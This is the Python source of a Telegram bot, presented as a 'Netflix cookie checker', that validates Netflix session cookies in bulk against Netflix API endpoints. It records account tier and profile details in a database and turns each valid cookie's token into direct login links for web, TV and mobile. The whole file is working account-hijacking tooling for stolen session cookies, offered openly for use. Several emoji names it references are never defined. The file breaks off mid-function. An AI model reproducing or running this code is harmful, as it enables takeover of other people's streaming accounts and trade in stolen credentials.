#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════╗
║  🎬 NETFLIX COOKIE CHECKER BOT - ULTIMATE EDITION             ║
║  ══════════════════════════════════════════════════════════════ ║
║  ✦ Developer: @Xalonexdev03                                   ║
║  ✦ Version: 2.0.0                                            ║
║  ✦ Features: Cookie Validation, Device Login, Bulk Check     ║
║  ✦ Support: Netscape, Standard, Base64 Formats               ║
╚══════════════════════════════════════════════════════════════════╝
"""

import os
import sys
import time
import json
import re
import base64
import logging
import asyncio
import aiohttp
import uuid
import tempfile
from datetime import datetime, timedelta, timezone
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass, field
from functools import wraps
from urllib.parse import urlparse, quote, unquote
import random
import string
import hashlib

# Telegram
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
from telegram.ext import (
    Application, CommandHandler, ContextTypes, 
    CallbackQueryHandler, MessageHandler, filters,
    ConversationHandler
)

# Database
from pymongo import MongoClient, ASCENDING, DESCENDING
import pymongo

# Load env
from dotenv import load_dotenv
load_dotenv()

# ============================ CONFIG ==================================
BOT_TOKEN = os.getenv("BOT_TOKEN")
MONGODB_URI = os.getenv("MONGODB_URI")
DATABASE_NAME = os.getenv("DATABASE_NAME", "netflix_bot")
ADMIN_IDS = [int(id.strip()) for id in os.getenv("ADMIN_IDS", "123456789").split(",")]

# API config
CHECK_TIMEOUT = int(os.getenv("CHECK_TIMEOUT", "45"))
MAX_BULK_CHECK = int(os.getenv("MAX_BULK_CHECK", "50"))
CONCURRENT_CHECKS = int(os.getenv("CONCURRENT_CHECKS", "3"))
EXPORT_DIR = os.getenv("EXPORT_DIR", "exports")

# ============================ LOGGING =================================
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO,
    handlers=[
        logging.FileHandler("netflix_bot.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("netflix_bot")

# ============================ CONSTANTS ===============================
SEP = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
VERSION = "2.0.0"

# ============================ EMOJI SYSTEM ============================
class Emoji:
    """Centralized emoji management for consistent styling"""
    # Status
    SUCCESS = "✅"
    ERROR = "❌"
    WARNING = "⚠️"
    INFO = "ℹ️"
    LOCK = "🔒"
    UNLOCK = "🔓"
    
    # Actions
    CHECK = "🔍"
    LOGIN = "🔑"
    UPLOAD = "📤"
    DOWNLOAD = "📥"
    EXPORT = "📦"
    CLEAN = "🧹"
    DELETE = "🗑️"
    
    # Objects
    COOKIE = "🍪"
    PROFILE = "👤"
    PLAN = "📊"
    CALENDAR = "📅"
    CLOCK = "⏰"
    ID = "🆔"
    LANGUAGE = "🌍"
    MATURITY = "🔞"
    
    # UI
    ARROW = "➜"
    BULLET = "▸"
    STAR = "⭐"
    FIRE = "🔥"
    ROCKET = "🚀"
    SPARKLE = "✨"
    CROWN = "👑"
    
    # Devices
    PC = "💻"
    TV = "📺"
    PHONE = "📱"
    TABLET = "📲"
    
    # Misc
    USER = "👤"
    USERS = "👥"
    ADMIN = "🛡️"
    BOT = "🤖"
    DEV = "🦇"

def fmt(text: str, emoji: str = None, bold: bool = False, code: bool = False, italic: bool = False) -> str:
    """Format text with HTML tags and optional emoji"""
    if emoji:
        text = f"{emoji} {text}"
    if bold:
        text = f"<b>{text}</b>"
    if code:
        text = f"<code>{text}</code>"
    if italic:
        text = f"<i>{text}</i>"
    return text

def header(title: str, emoji: str = Emoji.SPARKLE) -> str:
    """Create a styled header"""
    return f"\n{fmt(title, emoji, bold=True)}\n{SEP}"

def section(title: str, emoji: str = Emoji.BULLET) -> str:
    """Create a section header"""
    return f"\n{fmt(title, emoji, bold=True)}"

def line(key: str, value: str, emoji: str = Emoji.BULLET) -> str:
    """Create a key-value line"""
    return f"{fmt('', emoji)} <b>{key}:</b> <code>{value}</code>"

# ============================ DATABASE ================================
class Database:
    def __init__(self, uri=MONGODB_URI, db_name=DATABASE_NAME):
        if not uri:
            logger.error("❌ MONGODB_URI not set!")
            self.client = None
            self.db = None
            return
        try:
            self.client = MongoClient(uri, serverSelectionTimeoutMS=5000)
            self.db = self.client[db_name]
            self.users = self.db.users
            self.cookies = self.db.cookies
            self.checks = self.db.checks
            self.settings = self.db.settings
            self._init_indexes()
            self._init_defaults()
            logger.info("✅ Database connected successfully!")
        except Exception as e:
            logger.error(f"❌ Database connection failed: {e}")
            self.client = None
            self.db = None
    
    def _init_indexes(self):
        try:
            self.users.create_index([("user_id", ASCENDING)], unique=True)
            self.users.create_index([("approved", ASCENDING)])
            self.cookies.create_index([("cookie_hash", ASCENDING)], unique=True)
            self.cookies.create_index([("status", ASCENDING)])
            self.cookies.create_index([("account_tier", ASCENDING)])
            self.checks.create_index([("timestamp", DESCENDING)])
            logger.info("✅ Database indexes created")
        except Exception as e:
            logger.warning(f"⚠️ Index warning: {e}")
    
    def _init_defaults(self):
        for admin_id in ADMIN_IDS:
            self.users.update_one(
                {"user_id": admin_id},
                {"$set": {
                    "username": "admin",
                    "approved": True,
                    "is_admin": True,
                    "created_at": datetime.now(timezone.utc)
                }},
                upsert=True
            )
    
    def get_user(self, user_id: int) -> Optional[Dict]:
        if not self.db:
            return None
        return self.users.find_one({"user_id": user_id})
    
    def create_user(self, user_id: int, username: str = None) -> Dict:
        if not self.db:
            return {"user_id": user_id, "approved": False}
        existing = self.get_user(user_id)
        if existing:
            return existing
        user_data = {
            "user_id": user_id,
            "username": username,
            "approved": user_id in ADMIN_IDS,
            "is_admin": user_id in ADMIN_IDS,
            "approved_at": None,
            "total_checks": 0,
            "valid_cookies": 0,
            "created_at": datetime.now(timezone.utc),
            "last_active": datetime.now(timezone.utc)
        }
        try:
            self.users.insert_one(user_data)
            logger.info(f"✅ User created: {user_id}")
        except pymongo.errors.DuplicateKeyError:
            return self.get_user(user_id)
        return user_data
    
    def approve_user(self, user_id: int) -> bool:
        if not self.db:
            return False
        result = self.users.update_one(
            {"user_id": user_id},
            {"$set": {"approved": True, "approved_at": datetime.now(timezone.utc)}}
        )
        return result.modified_count > 0
    
    def disapprove_user(self, user_id: int) -> bool:
        if not self.db:
            return False
        result = self.users.update_one(
            {"user_id": user_id},
            {"$set": {"approved": False, "approved_at": None}}
        )
        return result.modified_count > 0
    
    def is_user_approved(self, user_id: int) -> bool:
        if not self.db:
            return user_id in ADMIN_IDS
        user = self.get_user(user_id)
        return user.get("approved", False) if user else False
    
    def update_user_activity(self, user_id: int):
        if not self.db:
            return
        self.users.update_one(
            {"user_id": user_id},
            {"$set": {"last_active": datetime.now(timezone.utc)}}
        )
    
    def increment_user_stats(self, user_id: int, check_count: int = 1, valid_count: int = 0):
        if not self.db:
            return
        self.users.update_one(
            {"user_id": user_id},
            {"$inc": {"total_checks": check_count, "valid_cookies": valid_count}}
        )
    
    def add_cookie(self, cookie: str, user_id: int = None) -> str:
        if not self.db:
            return str(uuid.uuid4())
        cookie = cookie.strip()
        cookie_hash = hashlib.sha256(cookie.encode()).hexdigest()
        existing = self.cookies.find_one({"cookie_hash": cookie_hash})
        if existing:
            return existing.get("_id")
        cookie_id = str(uuid.uuid4())
        cookie_data = {
            "_id": cookie_id,
            "cookie": cookie,
            "cookie_hash": cookie_hash,
            "user_id": user_id,
            "status": "pending",
            "account_tier": None,
            "profile_name": None,
            "profile_language": None,
            "maturity_level": None,
            "expires_at": None,
            "checked_at": None,
            "created_at": datetime.now(timezone.utc)
        }
        try:
            self.cookies.insert_one(cookie_data)
            return cookie_id
        except pymongo.errors.DuplicateKeyError:
            return self.cookies.find_one({"cookie_hash": cookie_hash})["_id"]
    
    def add_cookies_bulk(self, cookies: List[str], user_id: int = None) -> List[Dict]:
        results = []
        for cookie in cookies:
            cookie = cookie.strip()
            if cookie:
                try:
                    cookie_id = self.add_cookie(cookie, user_id)
                    results.append({"cookie": cookie, "id": cookie_id, "status": "added"})
                except Exception as e:
                    results.append({"cookie": cookie, "status": "error", "error": str(e)})
            else:
                results.append({"cookie": cookie, "status": "skipped"})
        return results
    
    def get_cookie(self, cookie_id: str) -> Optional[Dict]:
        if not self.db:
            return None
        return self.cookies.find_one({"_id": cookie_id})
    
    def find_cookie_by_prefix(self, prefix: str) -> Optional[Dict]:
        if not self.db:
            return None
        docs = list(self.cookies.find({"_id": {"$regex": f"^{prefix}"}}).limit(2))
        if len(docs) == 1:
            return docs[0]
        return None
    
    def get_cookie_by_hash(self, cookie_hash: str) -> Optional[Dict]:
        if not self.db:
            return None
        return self.cookies.find_one({"cookie_hash": cookie_hash})
    
    def update_cookie_status(self, cookie_id: str, status: str, details: Dict = None):
        if not self.db:
            return
        updates = {"status": status, "checked_at": datetime.now(timezone.utc)}
        if details:
            updates.update(details)
        self.cookies.update_one({"_id": cookie_id}, {"$set": updates})
    
    def get_valid_cookies(self, limit: int = 20) -> List[Dict]:
        if not self.db:
            return []
        return list(self.cookies.find({"status": "valid"}).sort("checked_at", -1).limit(limit))
    
    def get_cookie_stats(self) -> Dict:
        if not self.db:
            return {"total": 0, "valid": 0, "invalid": 0, "expired": 0, "pending": 0, "tiers": {}}
        total = self.cookies.count_documents({})
        valid = self.cookies.count_documents({"status": "valid"})
        invalid = self.cookies.count_documents({"status": "invalid"})
        expired = self.cookies.count_documents({"status": "expired"})
        pending = self.cookies.count_documents({"status": "pending"})
        return {
            "total": total,
            "valid": valid,
            "invalid": invalid,
            "expired": expired,
            "pending": pending,
            "tiers": {
                "Premium": self.cookies.count_documents({"status": "valid", "account_tier": "Premium"}),
                "Standard": self.cookies.count_documents({"status": "valid", "account_tier": "Standard"}),
                "Basic": self.cookies.count_documents({"status": "valid", "account_tier": "Basic"})
            }
        }
    
    def delete_invalid_cookies(self) -> int:
        if not self.db:
            return 0
        result = self.cookies.delete_many({"status": {"$in": ["invalid", "expired"]}})
        return result.deleted_count
    
    def delete_all_cookies(self) -> int:
        if not self.db:
            return 0
        result = self.cookies.delete_many({})
        return result.deleted_count
    
    def log_check(self, user_id: int, cookie_id: str, status: str, details: Dict = None):
        if not self.db:
            return
        self.checks.insert_one({
            "user_id": user_id,
            "cookie_id": cookie_id,
            "status": status,
            "details": details,
            "timestamp": datetime.now(timezone.utc)
        })
    
    def get_user_checks(self, user_id: int, limit: int = 10) -> List[Dict]:
        if not self.db:
            return []
        return list(self.checks.find({"user_id": user_id}).sort("timestamp", -1).limit(limit))

db = Database()

# ============================ COOKIE UTILITIES =========================
def parse_netscape_cookie(text: str) -> Dict[str, str]:
    """Parse Netscape format cookie file"""
    result = {}
    for line in text.strip().split('\n'):
        line = line.strip()
        if not line or line.startswith('#'):
            continue
        parts = line.split()
        if len(parts) >= 7:
            result[parts[5]] = parts[6]
    return result

def parse_cookie(cookie: str) -> Dict[str, str]:
    """Parse any cookie format into dict"""
    cookie = cookie.strip()
    result = {}
    
    # Try Netscape format
    if '.netflix.com' in cookie:
        try:
            parsed = parse_netscape_cookie(cookie)
            if parsed:
                return parsed
        except:
            pass
    
    # Try base64 decode
    try:
        decoded = base64.b64decode(cookie)
        try:
            decoded_str = decoded.decode('utf-8')
            if '=' in decoded_str:
                cookie = decoded_str
        except:
            pass
    except:
        pass
    
    # Standard format: key=value; key2=value2
    parts = cookie.replace(';', ' ').split()
    for part in parts:
        if '=' in part:
            key, val = part.split('=', 1)
            result[key.strip()] = val.strip()
    
    return result

def validate_cookie(cookie: str) -> bool:
    """Check if cookie is valid Netflix format"""
    if not cookie or len(cookie) < 10:
        return False
    
    cookie = cookie.strip()
    
    # Check for Netflix patterns
    patterns = ['NetflixId', 'nfvdid', 'SecureNetflixId', 'netflix_session']
    if any(p in cookie for p in patterns):
        return True
    
    # Netscape format
    if '.netflix.com' in cookie and 'TRUE' in cookie:
        return True
    
    # Base64 encoded
    try:
        decoded = base64.b64decode(cookie)
        decoded_str = decoded.decode('utf-8', errors='ignore')
        if any(p in decoded_str for p in patterns):
            return True
    except:
        pass
    
    return False

def extract_nftoken(cookie_str: str) -> Optional[str]:
    """Extract ct parameter from NetflixId"""
    cookie_dict = parse_cookie(cookie_str)
    netflix_id = cookie_dict.get('NetflixId')
    if not netflix_id:
        match = re.search(r'NetflixId=([^;]+)', cookie_str)
        if match:
            netflix_id = match.group(1)
    if not netflix_id:
        return None
    netflix_id = unquote(netflix_id)
    for part in netflix_id.split('&'):
        if part.startswith('ct='):
            return part[3:]
    return None

def build_login_keyboard(cookie_id: str, nftoken: str) -> InlineKeyboardMarkup:
    """Build device login keyboard"""
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("💻 Web", url=f"https://www.netflix.com/login?nftoken={nftoken}"),
            InlineKeyboardButton("📺 TV", url=f"https://www.netflix.com/tv8?nftoken={nftoken}"),
        ],
        [
            InlineKeyboardButton("📱 Android", url=f"https://www.netflix.com/login?nftoken={nftoken}"),
            InlineKeyboardButton("🍏 iPhone", url=f"https://www.netflix.com/login?nftoken={nftoken}"),
        ],
        [
            InlineKeyboardButton("📤 Upload File", callback_data=f"upload_{cookie_id}"),
            InlineKeyboardButton("🔄 Restart", callback_data="restart"),
        ]
    ])

# ============================ NETFLIX CHECKER =========================
class NetflixChecker:
    """Advanced Netflix cookie validator using API endpoints"""
    
    @staticmethod
    async def check_single_cookie(cookie: str) -> Dict:
        """
        Check a single Netflix cookie using official API endpoints.
        Returns: {valid, account_tier, profile_name, profile_language, maturity_level, expires_at, error}
        """
        result = {
            "valid": False,
            "account_tier": None,
            "profile_name": None,
            "profile_language": None,
            "maturity_level": None,
            "expires_at": None,
            "error": None
        }
        
        # Parse cookie
        cookie_dict = parse_cookie(cookie)
        if not cookie_dict:
            result["error"] = "No valid cookies found in input"
            return result
        
        # Build cookie string
        cookie_str = "; ".join([f"{k}={v}" for k, v in cookie_dict.items()])
        
        # Headers - Netflix expects these exactly
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Cookie": cookie_str,
            "Host": "www.netflix.com",
            "Origin": "https://www.netflix.com",
            "Referer": "https://www.netflix.com/",
            "Connection": "keep-alive",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-User": "?1",
            "Upgrade-Insecure-Requests": "1",
            "DNT": "1",
            "Cache-Control": "no-cache",
            "Pragma": "no-cache",
            "TE": "trailers"
        }
        
        try:
            async with aiohttp.ClientSession() as session:
                timeout = aiohttp.ClientTimeout(total=CHECK_TIMEOUT, connect=15)
                
                # Primary API: Profile metadata
                url = "https://www.netflix.com/api/shakti/viper/metadata"
                params = {
                    "movieid": "80057281",
                    "image_sizes": "185x278,464x696,50x70,278x185,696x278,70x50,96x96",
                    "image_format": "webp",
                    "with_size": "true",
                    "materialize": "true",
                    "uncached": "false"
                }
                
                async with session.get(
                    url,
                    headers=headers,
                    params=params,
                    timeout=timeout,
                    ssl=False
                ) as resp:
                    logger.info(f"📡 Profile API Status: {resp.status}")
                    
                    if resp.status == 200:
                        data = await resp.json()
                        if data and "video" in data:
                            result["valid"] = True
                            result["account_tier"] = NetflixChecker._detect_tier(data)
                            result["profile_name"] = NetflixChecker._get_profile_name(data)
                            result["profile_language"] = NetflixChecker._get_language(data)
                            result["maturity_level"] = NetflixChecker._get_maturity(data)
                            
                            # Get account details (expiry)
                            try:
                                acc_url = "https://www.netflix.com/api/shakti/viper/user"
                                async with session.get(
                                    acc_url,
                                    headers=headers,
                                    timeout=timeout,
                                    ssl=False
                                ) as acc_resp:
                                    if acc_resp.status == 200:
                                        acc_data = await acc_resp.json()
                                        if acc_data and "account" in acc_data:
                                            account = acc_data.get("account", {})
                                            if "expires" in account:
                                                result["expires_at"] = account.get("expires")
                            except Exception as e:
                                logger.debug(f"Account details error: {e}")
                            
                            return result
                        else:
                            result["error"] = "No video data in response"
                            return result
                    
                    elif resp.status == 401 or resp.status == 403:
                        result["error"] = "Cookie invalid - please login again"
                        return result
                    
                    elif resp.status == 404:
                        result["error"] = "Account not found"
                        return result
                    
                    elif resp.status == 421:
                        # Try alternate endpoint
                        headers["Host"] = "api.netflix.com"
                        headers["Origin"] = "https://api.netflix.com"
                        async with session.get(
                            url,
                            headers=headers,
                            params=params,
                            timeout=timeout,
                            ssl=False
                        ) as retry_resp:
                            if retry_resp.status == 200:
                                data = await retry_resp.json()
                                if data and "video" in data:
                                    result["valid"] = True
                                    result["account_tier"] = "Unknown"
                                    result["profile_name"] = "Unknown"
                                    return result
                            result["error"] = "Cookie expired or invalid (421)"
                            return result
                    
                    else:
                        result["error"] = f"HTTP {resp.status}"
                        return result
                        
        except asyncio.TimeoutError:
            result["error"] = "Connection timeout - Netflix slow"
        except aiohttp.ClientError as e:
            result["error"] = f"Network error: {str(e)}"
        except Exception as e:
            result["error"] = str(e)
        
        return result
    
    @staticmethod
    def _detect_tier(data: Dict) -> str:
        """Detect account tier from API response"""
        if "video" in data:
            video = data.get("video", {})
            if "tier" in video:
                tier = video.get("tier", "").lower()
                if "premium" in tier:
                    return "Premium"
                elif "standard" in tier:
                    return "Standard"
                elif "basic" in tier:
                    return "Basic"
        if "availableMaturityLevels" in data:
            levels = data.get("availableMaturityLevels", [])
            if len(levels) >= 4:
                return "Premium"
            elif len(levels) >= 3:
                return "Standard"
            elif len(levels) >= 2:
                return "Basic"
        return "Unknown"
    
    @staticmethod
    def _get_profile_name(data: Dict) -> str:
        if "profiles" in data and data["profiles"]:
            return data["profiles"][0].get("name", "Unknown")
        return "Unknown"
    
    @staticmethod
    def _get_language(data: Dict) -> str:
        return data.get("preferredLanguage", "en-US")
    
    @staticmethod
    def _get_maturity(data: Dict) -> str:
        return data.get("maturityLevel", "Unknown")
    
    @staticmethod
    async def check_bulk_cookies(cookies: List[str], progress_callback=None) -> List[Dict]:
        """Check multiple cookies with concurrency control"""
        results = []
        semaphore = asyncio.Semaphore(CONCURRENT_CHECKS)
        
        async def check_one(cookie: str, index: int):
            async with semaphore:
                result = await NetflixChecker.check_single_cookie(cookie)
                result["cookie"] = cookie
                result["index"] = index
                if progress_callback:
                    await progress_callback(index + 1, len(cookies))
                return result
        
        tasks = [check_one(cookie, i) for i, cookie in enumerate(cookies)]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        processed = []
        for result in results:
            if isinstance(result, Exception):
                processed.append({"cookie": "", "valid": False, "error": str(result)})
            else:
                processed.append(result)
        
        return processed

# ============================ TELEGRAM HANDLERS =======================
def admin_required(func):
    @wraps(func)
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE, *args, **kwargs):
        user_id = update.effective_user.id
        if user_id not in ADMIN_IDS:
            await update.message.reply_text(
                f"{Emoji.ERROR} <b>Access Denied</b>\n\n"
                f"You are not authorized to use this command.",
                parse_mode="HTML"
            )
            return
        return await func(update, context, *args, **kwargs)
    return wrapper

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Welcome message with bot overview"""
    user_id = update.effective_user.id
    username = update.effective_user.username
    
    db.create_user(user_id, username)
    
    if not db.is_user_approved(user_id):
        await update.message.reply_text(
            f"{Emoji.LOCK} <b>Access Restricted</b>\n\n"
            f"Your account is not approved for this bot.\n"
            f"Contact an administrator to request access.",
            parse_mode="HTML"
        )
        return
    
    text = (
        f"{Emoji.FIRE} <b>NETFLIX COOKIE CHECKER</b> {Emoji.FIRE}\n"
        f"{SEP}\n"
        f"{Emoji.BOT} <b>Version:</b> <code>{VERSION}</code>\n"
        f"{Emoji.DEV} <b>Developer:</b> <a href='https://t.me/Xalonexdev03'>@Xalonexdev03</a>\n\n"
        
        f"{Emoji.ROCKET} <b>What I Do:</b>\n"
        f"{Emoji.BULLET} Validate Netflix cookies instantly\n"
        f"{Emoji.BULLET} Detect account tier & profile details\n"
        f"{Emoji.BULLET} Generate device login links\n"
        f"{Emoji.BULLET} Bulk check from .txt files\n\n"
        
        f"{Emoji.COMMAND} <b>Commands:</b>\n"
        f"{Emoji.CHECK} <code>/check &lt;cookie&gt;</code>\n"
        f"   └ Check a single cookie\n"
        f"{Emoji.LOGIN} <code>/login &lt;id&gt;</code>\n"
        f"   └ Generate device login links\n"
        f"{Emoji.COOKIE} <code>/valid</code>\n"
        f"   └ View valid cookies\n"
        f"{Emoji.STATS} <code>/stats</code>\n"
        f"   └ Your usage statistics\n"
        f"{Emoji.HELP} <code>/help</code>\n"
        f"   └ Show this message\n\n"
        
        f"{Emoji.BULLET} <b>Supported Formats:</b>\n"
        f"{Emoji.BULLET} Standard: <code>key=value; key2=value2</code>\n"
        f"{Emoji.BULLET} Netscape: <code>.netflix.com TRUE / ...</code>\n"
        f"{Emoji.BULLET} Base64: <code>bmV0ZmxpeF9zZXNzaW9u...</code>\n\n"
        
        f"{Emoji.ADMIN} <b>Admin Commands:</b>\n"
        f"{Emoji.BULLET} <code>/approve &lt;user_id&gt;</code>\n"
        f"{Emoji.BULLET} <code>/disapprove &lt;user_id&gt;</code>\n"
        f"{Emoji.BULLET} <code>/users</code> - List all users\n"
        f"{Emoji.BULLET} <code>/export</code> - Export valid cookies\n"
        f"{Emoji.BULLET} <code>/cleanup</code> - Remove invalid cookies\n\n"
        
        f"{Emoji.SPARKLE} <b>Quick Tip:</b>\n"
        f"Send a <code>.txt</code> file for bulk check!"
    )
    
    await update.message.reply_text(
        text,
        parse_mode="HTML",
        disable_web_page_preview=True
    )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await start(update, context)

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show user statistics"""
    user_id = update.effective_user.id
    user = db.get_user(user_id)
    
    if not user:
        await update.message.reply_text(
            f"{Emoji.ERROR} <b>User not found</b>",
            parse_mode="HTML"
        )
        return
    
    global_stats = db.get_cookie_stats()
    recent = db.get_user_checks(user_id, 5)
    
    text = (
        f"{Emoji.STATS} <b>YOUR STATISTICS</b>\n"
        f"{SEP}\n"
        f"{Emoji.CHECK} <b>Total Checks:</b> <code>{user.get('total_checks', 0)}</code>\n"
        f"{Emoji.COOKIE} <b>Valid Cookies:</b> <code>{user.get('valid_cookies', 0)}</code>\n"
        f"{Emoji.CALENDAR} <b>Since:</b> <code>{user.get('created_at', datetime.now(timezone.utc)).strftime('%Y-%m-%d')}</code>\n\n"
        
        f"{Emoji.GLOBE} <b>Global Stats:</b>\n"
        f"{Emoji.BULLET} Total: <code>{global_stats['total']}</code>\n"
        f"{Emoji.BULLET} Valid: <code>{global_stats['valid']}</code>\n"
        f"{Emoji.BULLET} Invalid: <code>{global_stats['invalid']}</code>\n"
        f"{Emoji.BULLET} Expired: <code>{global_stats['expired']}</code>\n\n"
        
        f"{Emoji.PLAN} <b>Tier Distribution:</b>\n"
        f"{Emoji.STAR} Premium: <code>{global_stats['tiers']['Premium']}</code>\n"
        f"{Emoji.BULLET} Standard: <code>{global_stats['tiers']['Standard']}</code>\n"
        f"{Emoji.BULLET} Basic: <code>{global_stats['tiers']['Basic']}</code>\n"
    )
    
    if recent:
        text += f"\n{Emoji.CLOCK} <b>Recent Checks:</b>\n"
        for check in recent[:5]:
            status_emoji = Emoji.SUCCESS if check.get("status") == "valid" else Emoji.ERROR
            timestamp = check.get("timestamp", datetime.now(timezone.utc)).strftime("%H:%M")
            text += f"{status_emoji} {timestamp} - {check.get('status', 'unknown')}\n"
    
    await update.message.reply_text(text, parse_mode="HTML")

async def valid_cookies(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show valid cookies"""
    user_id = update.effective_user.id
    
    if not db.is_user_approved(user_id):
        await update.message.reply_text(
            f"{Emoji.LOCK} <b>Access Restricted</b>",
            parse_mode="HTML"
        )
        return
    
    cookies = db.get_valid_cookies(limit=20)
    
    if not cookies:
        await update.message.reply_text(
            f"{Emoji.INFO} <b>No Valid Cookies</b>\n\n"
            f"No valid cookies found in the database.",
            parse_mode="HTML"
        )
        return
    
    text = f"{Emoji.COOKIE} <b>VALID COOKIES</b>\n{SEP}\n"
    
    for i, cookie in enumerate(cookies[:10], 1):
        tier = cookie.get('account_tier', 'Unknown')
        profile = cookie.get('profile_name', 'Unknown')
        cid = cookie['_id']
        text += (
            f"{i}. {Emoji.PLAN} <b>{tier}</b>\n"
            f"   {Emoji.PROFILE} {profile}\n"
            f"   {Emoji.ID} <code>{cid[:8]}...</code>\n"
            f"   └ Use <code>/login {cid[:8]}</code>\n\n"
        )
    
    if len(cookies) > 10:
        text += f"\n{Emoji.INFO} <i>... and {len(cookies) - 10} more.</i>"
    
    await update.message.reply_text(text, parse_mode="HTML")

async def check_single(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check a single cookie"""
    user_id = update.effective_user.id
    
    if not db.is_user_approved(user_id):
        await update.message.reply_text(
            f"{Emoji.LOCK} <b>Access Restricted</b>",
            parse_mode="HTML"
        )
        return
    
    args = context.args
    if not args:
        await update.message.reply_text(
            f"{Emoji.ERROR} <b>Missing Cookie</b>\n\n"
            f"Usage: <code>/check &lt;cookie&gt;</code>\n"
            f"Or paste the cookie directly in chat.\n"
            f"Or send a <code>.txt</code> file for bulk check.",
            parse_mode="HTML"
        )
        return
    
    cookie = " ".join(args)
    
    if not validate_cookie(cookie):
        await update.message.reply_text(
            f"{Emoji.ERROR} <b>Invalid Cookie Format</b>\n\n"
            f"Supported formats:\n"
            f"{Emoji.BULLET} Standard: <code>key=value; key2=value2</code>\n"
            f"{Emoji.BULLET} Netscape: <code>.netflix.com TRUE / ...</code>\n"
            f"{Emoji.BULLET} Base64: <code>bmV0ZmxpeF9zZXNzaW9u...</code>",
            parse_mode="HTML"
        )
        return
    
    # Add to database
    cookie_id = db.add_cookie(cookie, user_id)
    
    msg = await update.message.reply_text(
        f"{Emoji.CHECK} <b>Verifying Cookie</b>\n"
        f"{Emoji.ID} ID: <code>{cookie_id}</code>\n"
        f"{Emoji.CLOCK} Please wait...",
        parse_mode="HTML"
    )
    
    # Check
    result = await NetflixChecker.check_single_cookie(cookie)
    
    # Update database
    if result.get("valid"):
        db.update_cookie_status(cookie_id, "valid", {
            "account_tier": result.get("account_tier"),
            "profile_name": result.get("profile_name"),
            "profile_language": result.get("profile_language"),
            "maturity_level": result.get("maturity_level"),
            "expires_at": result.get("expires_at")
        })
        db.increment_user_stats(user_id, 1, 1)
    else:
        status = "expired" if "expired" in str(result.get("error", "")).lower() else "invalid"
        db.update_cookie_status(cookie_id, status, {"error": result.get("error")})
        db.increment_user_stats(user_id, 1, 0)
    
    db.log_check(user_id, cookie_id, result.get("valid") and "valid" or "invalid", result)
    db.update_user_activity(user_id)
    
    # Build response
    if result.get("valid"):
        text = (
            f"{Emoji.SUCCESS} <b>COOKIE IS VALID</b>\n"
            f"{SEP}\n"
            f"{Emoji.PLAN} <b>Account:</b> <code>{result.get('account_tier', 'Unknown')}</code>\n"
            f"{Emoji.PROFILE} <b>Profile:</b> <code>{result.get('profile_name', 'Unknown')}</code>\n"
            f"{Emoji.LANGUAGE} <b>Language:</b> <code>{result.get('profile_language', 'Unknown')}</code>\n"
            f"{Emoji.MATURITY} <b>Maturity:</b> <code>{result.get('maturity_level', 'Unknown')}</code>\n"
        )
        if result.get('expires_at'):
            text += f"{Emoji.CALENDAR} <b>Expires:</b> <code>{result.get('expires_at')}</code>\n"
        text += f"\n{Emoji.ID} <b>Cookie ID:</b> <code>{cookie_id}</code>\n"
        text += f"\n{Emoji.SPARKLE} Use <code>/login {cookie_id[:8]}</code> for device login"
        
        # Check for nftoken for login keyboard
        nftoken = extract_nftoken(cookie)
        if nftoken:
            keyboard = build_login_keyboard(cookie_id, nftoken)
            await msg.edit_text(text, parse_mode="HTML", reply_markup=keyboard)
            return
    else:
        text = (
            f"{Emoji.ERROR} <b>COOKIE INVALID</b>\n"
            f"{SEP}\n"
            f"{Emoji.WARNING} <b>Error:</b> <code>{result.get('error', 'Unknown')}</code>\n"
            f"{Emoji.ID} <b>Cookie ID:</b> <code>{cookie_id}</code>"
        )
    
    await msg.edit_text(text, parse_mode="HTML")

async def login_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Generate device login links"""
    user_id = update.effective_user.id
    
    if not db.is_user_approved(user_id):
        await update.message.reply_text(
            f"{Emoji.LOCK} <b>Access Restricted</b>",
            parse_mode="HTML"
        )
        return
    
    args = context.args
    if not args:
        await update.message.reply_text(
            f"{Emoji.ERROR} <b>Missing ID</b>\n\n"
            f"Usage: <code>/login &lt;cookie_id&gt;</code>\n"
            f"Use full ID or first 8 characters.",
            parse_mode="HTML"
        )
        return
    
    user_input = args[0].strip()
    
    # Find cookie
    cookie_doc = db.get_cookie(user_input)
    if not cookie_doc:
        cookie_doc = db.find_cookie_by_prefix(user_input)
    
    if not cookie_doc:
        await update.message.reply_text(
            f"{Emoji.ERROR} <b>Cookie Not Found</b>\n\n"
            f"ID <code>{user_input}</code> not found.\n"
            f"Use <code>/valid</code> to see available cookies.",
            parse_mode="HTML"
        )
        return
    
    if cookie_doc.get("status") != "valid":
        await update.message.reply_text(
            f"{Emoji.ERROR} <b>Invalid Cookie</b>\n\n"
            f"Status: <code>{cookie_doc.get('status')}</code>\n"
            f"Only valid cookies can generate login links.",
            parse_mode="HTML"
        )
        return
    
    cookie_id = cookie_doc["_id"]
    cookie = cookie_doc.get("cookie", "")
    nftoken = extract_nftoken(cookie)
    
    if not nftoken:
        await update.message.reply_text(
            f"{Emoji.WARNING} <b>No NFToken Found</b>\n\n"
            f"Could not extract login token from this cookie.\n"
            f"Try re-adding and checking the cookie.",
            parse_mode="HTML"
        )
        return
    
    keyboard = build_login_keyboard(cookie_id, nftoken)
